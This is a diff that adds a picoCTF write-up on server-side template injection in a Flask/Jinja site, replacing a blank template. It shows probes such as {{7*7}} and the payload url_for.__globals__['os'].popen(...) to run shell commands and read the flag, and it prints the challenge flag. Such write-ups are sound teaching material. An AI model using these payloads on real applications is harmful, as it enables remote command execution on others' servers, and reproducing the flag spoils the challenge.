@@ -26,44 +26,47 @@ I just used `--` and `/*` to get through all the filters
 
 ***
 
-<!-- # 1. SSTI -->
-<!---->
-<!-- > Put in the challenge's description here -->
-<!---->
-<!-- ## Solution: -->
-<!---->
-<!-- - Include as many steps as you can with your thought process -->
-<!-- - You **must** include images such as screenshots wherever relevant. -->
-<!---->
-<!-- ``` -->
-<!-- put codes & terminal outputs here using triple backticks -->
-<!---->
-<!-- you may also use ```python for python codes for example -->
-<!-- ``` -->
-<!---->
-<!-- ## Flag: -->
-<!---->
-<!-- ``` -->
-<!-- picoCTF{} -->
-<!-- ``` -->
-<!---->
-<!-- ## Concepts learnt: -->
-<!---->
-<!-- - Include the new topics you've come across and explain them in brief -->
-<!-- -  -->
-<!---->
-<!-- ## Notes: -->
-<!---->
-<!-- - Include any alternate tangents you went on while solving the challenge, including mistakes & other solutions you found. -->
-<!-- -  -->
-<!---->
-<!-- ## Resources: -->
-<!---->
-<!-- - Include the resources you've referred to with links. [example hyperlink](https://google.com) -->
-<!---->
-<!---->
-<!-- *** -->
-<!---->
+# 1. SSTI
+
+> I made a cool website where you can announce whatever you want! Try it out!
+Additional details will be available after launching your challenge instance.
+
+
+## Solution:
+
+So basically I confirmed what template engine we are running by running {{7*7}} which resulted in 49 which means jinja, next I confirmed that if we are running flask by doing {{url_for}} which returned (url_for is a popular method in flask which has os module imported on module level)
+```
+<bound method Flask.url_for of <Flask 'app'>>
+```
+which means we can import os and run arbitarary commands 
+```
+{{url_for.__globals__['os'].popen("ls").read()}}
+
+``` 
+to run the ls command, after running the command we see a file flag which we can ofcourse cat
+```
+
+{{url_for.__globals__['os'].popen("cat flag").read()}}
+``` 
+which gives us the flag
+
+## Flag:
+
+```
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
+```
+
+## Concepts learnt:
+
+Basic SSTI and about jinja, and __globals__ and things like that
+
+## Resources:
+
+![PwnFunctions' video on SSTI](https://www.youtube.com/watch?v=SN6EVIG4c-0)
+
+
+***
+
 
 
 
